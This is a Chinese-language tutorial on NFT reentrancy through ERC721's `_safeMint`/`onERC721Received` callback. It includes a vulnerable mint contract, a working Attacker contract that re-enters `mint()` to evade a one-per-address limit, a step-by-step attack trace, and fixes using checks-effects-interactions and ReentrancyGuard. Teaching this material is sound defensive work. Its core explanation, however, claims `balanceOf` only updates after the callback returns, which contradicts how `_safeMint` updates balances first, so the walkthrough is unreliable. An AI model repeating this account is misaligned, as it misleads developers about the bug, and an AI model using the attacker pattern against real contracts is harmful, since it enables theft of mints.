# NFT重入攻击

### 1. 经典重入攻击复习

在深入 NFT 场景前，我们先快速回顾一下经典重入攻击的核心：

1. 一个合约 A 调用另一个外部合约 B。
2. 合约 A 在完成这次外部调用**之后**，才更新自己的内部状态（例如，扣减余额）。
3. 恶意合约 B 在被调用时，反过来**重新进入 (re-enter)** 合约 A 的同一个函数。
4. 由于合约 A 的状态还未更新，其内部检查（如“检查余额是否足够”）会再次通过，导致攻击者可以重复执行某个操作。



### 2. NFT 重入攻击的“钩子”：`onERC721Received`



那么，在 NFT 的世界里，攻击者是如何找到机会重新进入铸造函数的呢？答案就在于 ERC721 标准中的一个“安全”特性：**`_safeMint` 函数**。

- **`_mint` vs. `_safeMint`
  `_mint` 与 `_safeMint`**
  - `_mint()`：一个内部的、基础的铸造函数。它只是简单地创建一个新的 NFT 并分配给某个地址。
  - `_safeMint()`：这是一个更安全的版本。在将 NFT 分配给一个地址时，如果这个地址是一个**智能合约**，`_safeMint` 会**主动调用 (call)** 这个接收方合约的一个特殊函数——`onERC721Received()`。
- **`onERC721Received` 的作用**：
  - 它的设计初衷是好的，是为了防止 NFT 被意外地发送到一个无法处理 ERC721 代币的合约地址，导致 NFT 被永久锁定。接收方合约必须实现这个函数并返回一个特定的“魔术值”，才能证明自己“知道”如何接收和处理 NFT。
- **攻击的切入点**：
  - `_safeMint` 对接收方合约的这个**外部调用**，就为攻击者打开了重入的大门！如果 NFT 合约的铸造逻辑有缺陷，攻击者就可以在自己的 `onERC721Received` 函数里编写恶意代码，重新进入铸造函数。

------



### 3. 攻击场景实例：绕过“每人一个”的铸造限制



假设有一个热门的 NFT 项目，为了公平，规定每个钱包地址只能免费铸造一个 NFT。

**有漏洞的 NFT 合约 (`VulnerableNFT.sol`) 👎**

Solidity 坚固性

```
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@openzeppelin/contracts/utils/Counters.sol";

contract VulnerableNFT is ERC721 {
    using Counters for Counters.Counter;
    Counters.Counter private _tokenIdCounter;

    constructor() ERC721("Vulnerable NFT", "VNFT") {}

    function mint() public {
        // **漏洞点 1: 检查在交互之前**
        // 检查用户是否已经铸造过
        require(balanceOf(msg.sender) == 0, "Each address can only mint one NFT.");

        _tokenIdCounter.increment();
        uint256 tokenId = _tokenIdCounter.current();

        // **漏洞点 2: 交互 (外部调用) 在状态更新之前**
        // 使用了 _safeMint，它会调用外部合约
        _safeMint(msg.sender, tokenId);

        // 想象一下如果还有其他状态更新，比如 hasMinted[msg.sender] = true;
        // 放在这里就太晚了。
    }
}
```

这个合约的逻辑看起来没问题：先检查余额，再铸造。但它违反了安全的**“检查-生效-交互”**模式。状态的真正改变（`balanceOf` 的增加）发生在 `_safeMint` 这个“交互”步骤**之后**。

**攻击者的合约 (`Attacker.sol`)**

Solidity 坚固性

```
import "./VulnerableNFT.sol";

contract Attacker {
    VulnerableNFT public vulnerableNft;
    uint256 public mintCount = 0;

    constructor(address _nftAddress) {
        vulnerableNft = VulnerableNFT(_nftAddress);
    }

    // 攻击入口函数
    function attack() public {
        // 只需要调用一次 mint()
        vulnerableNft.mint();
    }

    // **核心攻击代码：重入的钩子**
    // 当 _safeMint 调用本合约时，这个函数会被触发
    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external returns (bytes4) {
        // 如果我们还没铸造够5个，就继续调用 mint()
        if (mintCount < 5) {
            mintCount++;
            vulnerableNft.mint(); // **重新进入！**
        }
        return this.onERC721Received.selector;
    }
}
```

**攻击流程一步步分解：**

1. 攻击者部署 `Attacker` 合约。
2. 攻击者调用 `Attacker.attack()`，这会触发对 `VulnerableNFT.mint()` 的第一次调用。
3. **进入 `mint()` (第一次)**：
   - `require(balanceOf(Attacker.address) == 0)` 检查通过，因为攻击合约此时确实没有 NFT。
   - 合约执行 `_safeMint(Attacker.address, 1)`。
4. **控制权转移**：`_safeMint` 检测到接收方是合约，于是调用 `Attacker.onERC721Received()`。程序的执行流程进入了攻击者的合约！
5. **进入 `onERC721Received()`**：
   - `mintCount` (初始为0) 小于5，条件成立。
   - `mintCount` 增加到1。
   - 攻击合约**再次调用** `VulnerableNFT.mint()`。
6. **重新进入 `mint()` (第二次)**：
   - `require(balanceOf(Attacker.address) == 0)` **检查再次通过！** 为什么？因为第一次的 `_safeMint` 调用还没有执行完毕，`balanceOf` 的状态更新要等到整个外部调用（包括 `onERC721Received`）全部返回后才会最终完成。
   - 合约执行 `_safeMint(Attacker.address, 2)`，这又会触发 `onERC721Received`...
7. 这个过程会循环往复，直到 `onERC721Received` 中的 `mintCount < 5` 条件不再满足。
8. 最终，所有调用栈依次返回，状态被更新。攻击者**只发起了一笔交易，却成功地为自己铸造了5个 NFT**，完全绕过了“每人一个”的限制。

------



### 4. 如何修复和防范？



防范方法完全遵循经典重入攻击的解决方案。



#### a. 遵循“检查-生效-交互”模式 (Checks-Effects-Interactions)



这是最根本的解决方案。**在进行任何可能触发外部调用的交互之前，完成所有内部状态的更新。**

**安全的代码 (手动更新状态) 👍**

Solidity 坚固性

```
contract SecureNFT is ERC721 {
    mapping(address => bool) public hasMinted;
    // ...

    function mint() public {
        // 1. 检查 (Check)
        require(!hasMinted[msg.sender], "Already minted.");

        // 2. 生效 (Effect) - **先更新状态！**
        hasMinted[msg.sender] = true;

        // ... 分配 tokenId ...

        // 3. 交互 (Interaction) - 最后才进行外部调用
        _safeMint(msg.sender, tokenId);
    }
}
```

在这个安全版本中，当攻击者重入 `mint()` 时，`hasMinted` 检查会立即失败，从而阻止了攻击。



#### b. 使用 OpenZeppelin 的 `ReentrancyGuard`



这是最简单、最有效的“一键式”解决方案。

**安全的代码 (使用修饰符) 👍**

Solidity 坚固性

```
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract SecureNFT is ERC721, ReentrancyGuard {
    // ...
    
    // 使用 nonReentrant 修饰符
    function mint() public nonReentrant {
        require(balanceOf(msg.sender) == 0, "Already minted.");
        // ...
        _safeMint(msg.sender, tokenId);
    }
}
```

`nonReentrant` 修饰符会在函数开始时“上锁”，在函数结束时“解锁”。如果函数在执行期间被重入，它会检测到锁还未被解开，并立即 `revert` 交易。

**总结：** NFT 重入攻击是利用了 `_safeMint` 中 `onERC721Received` 回调机制的一个巧妙攻击。开发者必须时刻警惕任何可能导致外部调用的函数（如 `_safeMint`），并严格遵守**“检查-生效-交互”**的设计模式，或者直接使用像 `ReentrancyGuard` 这样经过审计的安全模块来保护自己的合约。

